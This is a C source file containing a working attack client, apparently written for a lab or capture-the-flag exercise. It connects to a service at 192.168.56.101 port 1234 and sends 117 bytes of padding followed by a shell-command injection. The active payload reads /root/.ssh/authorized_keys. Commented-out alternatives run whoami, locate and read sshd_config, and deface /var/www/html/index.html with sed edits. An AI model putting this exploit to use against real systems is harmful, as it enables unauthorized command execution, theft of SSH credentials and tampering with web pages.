#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main (int argc, char** argv){
    int sockfd=-1;
    struct sockaddr_in server;

    memset(&server,0,sizeof(server));
    server.sin_family=AF_INET;
    server.sin_port=htons(1234);
    server.sin_addr.s_addr=inet_addr("192.168.56.101");

    if ((sockfd=socket(AF_INET,SOCK_STREAM,0))<0){
        perror("Socket creation failed");
        return 1;
    }

    if (connect(sockfd,(struct sockaddr *)&server,sizeof(server))<0){
        perror("connection failed");
        return 1;
    }

    char *s=malloc(512);
    memset(s,'h',117);
    s[117] = '\0';
    //char command[]= "; whoami ; #";
    //char command[]= "; cat /etc/ssh/sshd_config #";
    //char command[] = "; find / -name \"sshd_config\" 2>/dev/null ; #";
    //char command[]="; grep \"Port \" /etc/ssh/sshd_config ; #";
    char command[]="; cat /root/.ssh/authorized_keys ; #";
    //char command[]= "; sed -i \"/Ons Chouaibi/d\" /var/www/html/index.html; #";
    //char command[]= "; sed -i \"/^\\s*$/d\" /var/www/html/index.html; #";
    //char command[]="; sed -i \"s/<\\/body>/<p>Ons Chouaibi<\\/p>\\n<\\/body>/\" /var/www/html/index.html; #";
    strncat(s,command,512 - strlen(s) - 1);
    if (send(sockfd,s,strlen(s),0)<0){
        perror("send failed");
        return 1;
    }
    char buffer[1024];
    memset(buffer,0,1024);
    while (1){
        int bytes_received=recv(sockfd,buffer,1023,0);
        if(bytes_received<=0){
            break;
        }
        else{
            printf("%s\n",buffer);
        }
    }
    close(sockfd);
    free(s);
    printf("success\n");
    return 0;

}